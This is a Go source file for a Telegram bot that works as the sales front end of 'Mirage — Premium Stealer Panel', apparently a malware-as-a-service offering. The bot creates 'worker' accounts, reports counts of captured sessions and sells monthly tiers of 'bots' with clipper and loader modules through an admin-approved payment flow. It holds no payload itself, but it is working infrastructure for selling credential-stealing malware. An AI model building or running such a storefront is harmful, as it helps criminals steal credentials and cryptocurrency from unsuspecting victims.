package bot

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
	"golang.org/x/crypto/bcrypt"

	dbutil "zialfi-panel/internal/db"
)

// Bot implements the Mirage Telegram sales bot.
type Bot struct {
	token       string
	db          *sql.DB
	apiBase     string
	adminChatID string
	panelURL    string
	offset      int
}

// InlineButton represents a single inline keyboard button.
type InlineButton struct {
	Text string `json:"text"`
	Data string `json:"callback_data"`
}

// InlineKeyboardMarkup is the Telegram inline keyboard.
type InlineKeyboardMarkup struct {
	InlineKeyboard [][]InlineButton `json:"inline_keyboard"`
}

// tgUpdate is a partial Telegram update.
type tgUpdate struct {
	UpdateID int         `json:"update_id"`
	Message  *tgMessage  `json:"message"`
	Callback *tgCallback `json:"callback_query"`
}

type tgMessage struct {
	MessageID int    `json:"message_id"`
	Chat      tgChat `json:"chat"`
	From      tgFrom `json:"from"`
	Text      string `json:"text"`
}

type tgCallback struct {
	ID      string     `json:"id"`
	Message *tgMessage `json:"message"`
	From    tgFrom     `json:"from"`
	Data    string     `json:"data"`
}

type tgChat struct {
	ID int64 `json:"id"`
}

type tgFrom struct {
	ID       int64  `json:"id"`
	Username string `json:"username"`
}

// New creates a Bot reading config from the settings table.
func New(db *sql.DB) *Bot {
	// Token: env TELEGRAM_BOT_TOKEN first, then settings table
	token := os.Getenv("TELEGRAM_BOT_TOKEN")
	if token == "" {
		dbutil.QueryRow(db, "SELECT value FROM settings WHERE key = 'telegram_token'").Scan(&token)
	}
	var adminChat, panelURL string
	dbutil.QueryRow(db, "SELECT value FROM settings WHERE key = 'bot_admin_chat_id'").Scan(&adminChat)
	dbutil.QueryRow(db, "SELECT value FROM settings WHERE key = 'panel_url'").Scan(&panelURL)
	if panelURL == "" {
		panelURL = "http://localhost:8080"
	}
	return &Bot{
		token:       token,
		db:          db,
		apiBase:     "https://api.telegram.org/bot" + token,
		adminChatID: adminChat,
		panelURL:    panelURL,
	}
}

// Start begins long-polling in a goroutine.
func (b *Bot) Start() {
	if b.token == "" {
		slog.Info("telegram bot: no token configured, skipping")
		return
	}
	slog.Info("telegram bot started polling")
	for {
		updates, err := b.getUpdates()
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		for _, upd := range updates {
			b.handleUpdate(upd)
			if upd.UpdateID >= b.offset {
				b.offset = upd.UpdateID + 1
			}
		}
	}
}

func (b *Bot) getUpdates() ([]tgUpdate, error) {
	url := fmt.Sprintf("%s/getUpdates?offset=%d&timeout=30", b.apiBase, b.offset)
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var result struct {
		OK     bool       `json:"ok"`
		Result []tgUpdate `json:"result"`
	}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, err
	}
	if !result.OK {
		return nil, fmt.Errorf("telegram API error")
	}
	return result.Result, nil
}

func (b *Bot) handleUpdate(upd tgUpdate) {
	if upd.Message != nil && upd.Message.Text == "/start" {
		b.handleStart(upd.Message)
		return
	}
	if upd.Callback != nil {
		b.handleCallback(upd.Callback)
		return
	}
}

// ── /start handler ──────────────────────────────────────────────────

func (b *Bot) handleStart(msg *tgMessage) {
	tgID := fmt.Sprintf("%d", msg.From.ID)

	// Check if user already exists
	var userID, username, passwordHash string
	err := dbutil.QueryRow(b.db, "SELECT id, username, password_hash FROM users WHERE telegram_id = ?", tgID).Scan(&userID, &username, &passwordHash)

	if err == nil {
		// Already registered — show main menu
		b.sendMainMenu(msg.Chat.ID, msg.MessageID, username)
		return
	}

	// New user — generate credentials
	username = "user_" + randomString(8)
	password := randomString(16)
	userID = uuid.New().String()

	pwHash, err := bcrypt.GenerateFromPassword([]byte(password), 12)
	if err != nil {
		slog.Error("bot: bcrypt failed", "err", err)
		b.sendMessage(msg.Chat.ID, "❌ Something went wrong. Please try again later.", "")
		return
	}

	_, err = dbutil.Exec(b.db, "INSERT INTO users (id, username, password_hash, role, telegram_id) VALUES (?, ?, ?, 'worker', ?)", userID, username, string(pwHash), tgID)
	if err != nil {
		slog.Error("bot: create user failed", "err", err)
		b.sendMessage(msg.Chat.ID, "❌ Something went wrong. Please try again later.", "")
		return
	}

	// Generate 8 recovery codes
	codes := make([]string, 8)
	for i := range codes {
		code := randomString(10)
		codes[i] = code
		codeHash := sha256.Sum256([]byte(code))
		codeID := uuid.New().String()
		dbutil.Exec(b.db, "INSERT INTO recovery_codes (id, user_id, code_hash) VALUES (?, ?, ?)", codeID, userID, hex.EncodeToString(codeHash[:]))
	}

	// Format credentials message
	codesText := ""
	for i, code := range codes {
		codesText += fmt.Sprintf("  %d. <code>%s</code>\n", i+1, code)
	}

	text := fmt.Sprintf(
		"✅ <b>Account Created</b>\n\n"+
			"📋 <b>Username:</b> <code>%s</code>\n"+
			"🔑 <b>Password:</b> <code>%s</code>\n\n"+
			"🔗 <b>Panel:</b> %s\n\n"+
			"🔐 <b>Recovery Codes</b> (save these, each can be used once):\n"+
			"%s\n"+
			"⚠️ <i>These codes are the ONLY way to recover your password.</i>",
		username, password, b.panelURL, codesText,
	)

	savedBtn := InlineButton{Text: "✅ Saved", Data: "saved:" + userID}
	keyboard := inlineKeyboard([]InlineButton{savedBtn})
	b.sendMessageMarkup(msg.Chat.ID, text, keyboard)
}

// ── Callback handler ────────────────────────────────────────────────

func (b *Bot) handleCallback(cb *tgCallback) {
	data := cb.Data
	chatID := cb.Message.Chat.ID
	msgID := cb.Message.MessageID

	switch {
	case strings.HasPrefix(data, "saved:"):
		userID := strings.TrimPrefix(data, "saved:")
		var username string
		dbutil.QueryRow(b.db, "SELECT username FROM users WHERE id = ?", userID).Scan(&username)
		b.answerCallback(cb.ID)
		b.editMainMenu(chatID, msgID, username)

	case data == "menu:main":
		var username string
		tgID := fmt.Sprintf("%d", cb.From.ID)
		dbutil.QueryRow(b.db, "SELECT username FROM users WHERE telegram_id = ?", tgID).Scan(&username)
		b.answerCallback(cb.ID)
		b.editMainMenu(chatID, msgID, username)

	case data == "menu:stats":
		b.answerCallback(cb.ID)
		b.handleStats(chatID, msgID)

	case data == "menu:account":
		b.answerCallback(cb.ID)
		b.handleAccount(chatID, msgID, cb.From.ID)

	case data == "menu:buy":
		b.answerCallback(cb.ID)
		b.handleBuyMenu(chatID, msgID)

	case data == "menu:docs":
		b.answerCallback(cb.ID)
		text := fmt.Sprintf("📖 <b>Documentation</b>\n\nRead the docs at:\n%s/docs", b.panelURL)
		backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
		b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))

	case data == "menu:support":
		b.answerCallback(cb.ID)
		text := "💬 <b>Support</b>\n\nFor help, contact: @t3ns0r_official"
		backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
		b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))

	case data == "menu:settings":
		b.answerCallback(cb.ID)
		text := "⚙️ <b>Settings</b>\n\nLanguage: English"
		enBtn := InlineButton{Text: "🇺🇸 English", Data: "lang:en"}
		ruBtn := InlineButton{Text: "🇷🇺 Русский", Data: "lang:ru"}
		backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
		b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{enBtn, ruBtn}, []InlineButton{backBtn}))

	case strings.HasPrefix(data, "lang:"):
		b.answerCallback(cb.ID)
		lang := strings.TrimPrefix(data, "lang:")
		text := fmt.Sprintf("⚙️ Language set to: %s", map[string]string{"en": "English", "ru": "Русский"}[lang])
		backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
		b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))

	case strings.HasPrefix(data, "buy:"):
		b.answerCallback(cb.ID)
		tier := strings.TrimPrefix(data, "buy:")
		b.handleBuyConfirm(chatID, msgID, tier, cb.From.ID)

	case strings.HasPrefix(data, "confirm:"):
		b.answerCallback(cb.ID)
		tier := strings.TrimPrefix(data, "confirm:")
		b.handleBuySubmit(chatID, msgID, tier, cb.From.ID)

	case data == "approve" || strings.HasPrefix(data, "approve:"):
		b.answerCallback(cb.ID)
		reqID := strings.TrimPrefix(data, "approve:")
		if reqID == "approve" {
			reqID = "" // legacy format
		}
		b.handleApprove(chatID, msgID, reqID, cb.From.ID)

	case data == "reject" || strings.HasPrefix(data, "reject:"):
		b.answerCallback(cb.ID)
		reqID := strings.TrimPrefix(data, "reject:")
		if reqID == "reject" {
			reqID = ""
		}
		b.handleReject(chatID, msgID, reqID)
	}
}

// ── Main menu ───────────────────────────────────────────────────────

func (b *Bot) editMainMenu(chatID int64, msgID int, username string) {
	text := fmt.Sprintf(
		"🏪 <b>Mirage</b> — Premium Stealer Panel\n\n"+
			"Welcome, <b>%s</b>!\n\n"+
			"Choose an option below:",
		username,
	)
	keyboard := inlineKeyboard(
		[]InlineButton{
			{Text: "📊 Statistics", Data: "menu:stats"},
			{Text: "🖥 My Account", Data: "menu:account"},
		},
		[]InlineButton{
			{Text: "🛒 Buy Subscription", Data: "menu:buy"},
			{Text: "📖 Documentation", Data: "menu:docs"},
		},
		[]InlineButton{
			{Text: "💬 Support", Data: "menu:support"},
			{Text: "⚙️ Settings", Data: "menu:settings"},
		},
	)
	b.editMessageMarkup(chatID, msgID, text, keyboard)
}

func (b *Bot) sendMainMenu(chatID int64, _ int, username string) {
	text := fmt.Sprintf(
		"🏪 <b>Mirage</b> — Premium Stealer Panel\n\n"+
			"Welcome back, <b>%s</b>!\n\n"+
			"Choose an option below:",
		username,
	)
	keyboard := inlineKeyboard(
		[]InlineButton{
			{Text: "📊 Statistics", Data: "menu:stats"},
			{Text: "🖥 My Account", Data: "menu:account"},
		},
		[]InlineButton{
			{Text: "🛒 Buy Subscription", Data: "menu:buy"},
			{Text: "📖 Documentation", Data: "menu:docs"},
		},
		[]InlineButton{
			{Text: "💬 Support", Data: "menu:support"},
			{Text: "⚙️ Settings", Data: "menu:settings"},
		},
	)
	b.sendMessageMarkup(chatID, text, keyboard)
}

// ── Stats ───────────────────────────────────────────────────────────

func (b *Bot) handleStats(chatID int64, msgID int) {
	var total, today int
	dbutil.QueryRow(b.db, "SELECT COUNT(*) FROM sessions").Scan(&total)
	dbutil.QueryRow(b.db, "SELECT COUNT(*) FROM sessions WHERE created_at::date = CURRENT_TIMESTAMP::date").Scan(&today)

	text := fmt.Sprintf(
		"📊 <b>Statistics</b>\n\n"+
			"📋 Total sessions: <b>%d</b>\n"+
			"📈 Today: <b>%d</b>",
		total, today,
	)
	backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
	b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))
}

// ── Account ─────────────────────────────────────────────────────────

func (b *Bot) handleAccount(chatID int64, msgID int, tgID int64) {
	tgIDStr := fmt.Sprintf("%d", tgID)
	var username, role, createdAt string
	err := dbutil.QueryRow(b.db, "SELECT username, role, created_at FROM users WHERE telegram_id = ?", tgIDStr).Scan(&username, &role, &createdAt)
	if err != nil {
		text := "❌ Account not found. Use /start to register."
		b.editMessageMarkup(chatID, msgID, text, inlineKeyboard())
		return
	}

	text := fmt.Sprintf(
		"🖥 <b>My Account</b>\n\n"+
			"👤 Username: <code>%s</code>\n"+
			"🏷 Role: <b>%s</b>\n"+
			"📅 Registered: <b>%s</b>",
		username, role, createdAt[:10],
	)
	backBtn := InlineButton{Text: "← Back", Data: "menu:main"}
	b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))
}

// ── Buy ─────────────────────────────────────────────────────────────

func (b *Bot) handleBuyMenu(chatID int64, msgID int) {
	text := "🛒 <b>Choose your plan:</b>\n\n" +
		"🟢 <b>Starter</b> — $70/mo\n" +
		"   1 bot, 1 user, basic features\n\n" +
		"🔵 <b>Pro</b> — $150/mo\n" +
		"   7 bots, 5 users, smart filters, clipper\n\n" +
		"🟣 <b>Team</b> — $350/mo\n" +
		"   15 bots, 20 users, all modules, PostgreSQL"

	keyboard := inlineKeyboard(
		[]InlineButton{
			{Text: "🟢 Starter $70", Data: "buy:starter"},
			{Text: "🔵 Pro $150", Data: "buy:pro"},
		},
		[]InlineButton{
			{Text: "🟣 Team $350", Data: "buy:team"},
		},
		[]InlineButton{
			{Text: "← Back", Data: "menu:main"},
		},
	)
	b.editMessageMarkup(chatID, msgID, text, keyboard)
}

func (b *Bot) handleBuyConfirm(chatID int64, msgID int, tier string, tgID int64) {
	tiers := map[string]struct {
		name  string
		price string
		desc  string
	}{
		"starter": {"Starter", "$70/mo", "1 bot, 1 user, basic features"},
		"pro":     {"Pro", "$150/mo", "7 bots, 5 users, smart filters, clipper & loader"},
		"team":    {"Team", "$350/mo", "15 bots, 20 users, all modules, PostgreSQL"},
	}
	t, ok := tiers[tier]
	if !ok {
		return
	}

	text := fmt.Sprintf(
		"🛒 <b>Confirm purchase:</b>\n\n"+
			"Plan: <b>%s</b> — %s\n%s\n\n"+
			"Proceed with purchase?",
		t.name, t.price, t.desc,
	)
	keyboard := inlineKeyboard(
		[]InlineButton{
			{Text: "✅ Confirm", Data: "confirm:" + tier},
			{Text: "← Back", Data: "menu:buy"},
		},
	)
	b.editMessageMarkup(chatID, msgID, text, keyboard)
}

func (b *Bot) handleBuySubmit(chatID int64, msgID int, tier string, tgID int64) {
	tgIDStr := fmt.Sprintf("%d", tgID)
	var userID, username string
	err := dbutil.QueryRow(b.db, "SELECT id, username FROM users WHERE telegram_id = ?", tgIDStr).Scan(&userID, &username)
	if err != nil {
		b.editMessageMarkup(chatID, msgID, "❌ Account not found. Use /start to register.", inlineKeyboard())
		return
	}

	reqID := uuid.New().String()
	_, err = dbutil.Exec(b.db, "INSERT INTO purchase_requests (id, user_id, tier, status) VALUES (?, ?, ?, 'pending')", reqID, userID, tier)
	if err != nil {
		slog.Error("bot: create purchase request failed", "err", err)
		b.editMessageMarkup(chatID, msgID, "❌ Something went wrong.", inlineKeyboard())
		return
	}

	// Notify admin chat
	if b.adminChatID != "" {
		var adminChatID int64
		fmt.Sscanf(b.adminChatID, "%d", &adminChatID)
		adminText := fmt.Sprintf(
			"🛒 <b>New purchase request</b>\n\n"+
				"User: <b>%s</b>\n"+
				"Tier: <b>%s</b>\n"+
				"Request ID: <code>%s</code>",
			username, tier, reqID[:8],
		)
		approveBtn := InlineButton{Text: "✅ Approve", Data: "approve:" + reqID}
		rejectBtn := InlineButton{Text: "❌ Reject", Data: "reject:" + reqID}
		adminKeyboard := inlineKeyboard([]InlineButton{approveBtn, rejectBtn})
		b.sendMessageMarkup(adminChatID, adminText, adminKeyboard)
	}

	// Confirm to user
	text := fmt.Sprintf(
		"✅ <b>Request submitted!</b>\n\n"+
			"Plan: <b>%s</b>\n\n"+
			"<b>Next steps:</b>\n"+
			"1. Contact @t3ns0r_official to complete payment\n"+
			"2. Send your username: <code>%s</code>\n"+
			"3. After payment confirmation, your subscription will be activated",
		tier, username,
	)
	backBtn := InlineButton{Text: "← Back to menu", Data: "menu:main"}
	b.editMessageMarkup(chatID, msgID, text, inlineKeyboard([]InlineButton{backBtn}))
}

// ── Admin approve/reject ────────────────────────────────────────────

func (b *Bot) handleApprove(chatID int64, msgID int, reqID string, adminTGID int64) {
	// Find the request
	var userID, tier string
	err := dbutil.QueryRow(b.db, "SELECT user_id, tier FROM purchase_requests WHERE id = ?", reqID).Scan(&userID, &tier)
	if err != nil {
		b.editMessageMarkup(chatID, msgID, "❌ Request not found.", inlineKeyboard())
		return
	}

	dbutil.Exec(b.db, "UPDATE purchase_requests SET status = 'approved', updated_at = CURRENT_TIMESTAMP WHERE id = ?", reqID)

	// Notify user
	var userTGID string
	dbutil.QueryRow(b.db, "SELECT telegram_id FROM users WHERE id = ?", userID).Scan(&userTGID)
	if userTGID != "" {
		var tgID int64
		fmt.Sscanf(userTGID, "%d", &tgID)
		userText := fmt.Sprintf(
			"🎉 <b>Subscription activated!</b>\n\n"+
				"Plan: <b>%s</b>\n\n"+
				"Your subscription is now active. Enjoy!",
			tier,
		)
		menuBtn := InlineButton{Text: "← Main menu", Data: "menu:main"}
		b.sendMessageMarkup(tgID, userText, inlineKeyboard([]InlineButton{menuBtn}))
	}

	b.editMessageMarkup(chatID, msgID, fmt.Sprintf("✅ Approved: %s (%s)", tier, reqID[:8]), inlineKeyboard())
}

func (b *Bot) handleReject(chatID int64, msgID int, reqID string) {
	dbutil.Exec(b.db, "UPDATE purchase_requests SET status = 'rejected', updated_at = CURRENT_TIMESTAMP WHERE id = ?", reqID)
	b.editMessageMarkup(chatID, msgID, fmt.Sprintf("❌ Rejected: %s", reqID[:8]), inlineKeyboard())
}

// ── Telegram API helpers ────────────────────────────────────────────

func (b *Bot) sendMessage(chatID int64, text string, parseMode string) {
	b.sendMessageMarkup(chatID, text, "")
}

func (b *Bot) sendMessageMarkup(chatID int64, text string, markup string) {
	payload := map[string]any{
		"chat_id":    chatID,
		"text":       text,
		"parse_mode": "HTML",
	}
	if markup != "" {
		var kb InlineKeyboardMarkup
		json.Unmarshal([]byte(markup), &kb)
		payload["reply_markup"] = kb
	}
	data, _ := json.Marshal(payload)
	resp, err := http.Post(b.apiBase+"/sendMessage", "application/json", bytes.NewReader(data))
	if err != nil {
		slog.Error("bot: sendMessage failed", "err", err)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

func (b *Bot) editMessageMarkup(chatID int64, msgID int, text string, markup string) {
	payload := map[string]any{
		"chat_id":    chatID,
		"message_id": msgID,
		"text":       text,
		"parse_mode": "HTML",
	}
	if markup != "" {
		var kb InlineKeyboardMarkup
		json.Unmarshal([]byte(markup), &kb)
		payload["reply_markup"] = kb
	}
	data, _ := json.Marshal(payload)
	resp, err := http.Post(b.apiBase+"/editMessageText", "application/json", bytes.NewReader(data))
	if err != nil {
		slog.Error("bot: editMessage failed", "err", err)
		return
	}
	defer resp.Body.Close()
	io.Copy(io.Discard, resp.Body)
}

func (b *Bot) answerCallback(callbackID string) {
	payload := map[string]string{"callback_query_id": callbackID}
	data, _ := json.Marshal(payload)
	http.Post(b.apiBase+"/answerCallbackQuery", "application/json", bytes.NewReader(data))
}

func inlineKeyboard(rows ...[]InlineButton) string {
	kb := InlineKeyboardMarkup{InlineKeyboard: rows}
	data, _ := json.Marshal(kb)
	return string(data)
}

func randomString(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	const charset = "abcdefghijkmnpqrstuvwxyz23456789"
	for i, v := range b {
		b[i] = charset[int(v)%len(charset)]
	}
	return string(b)
}
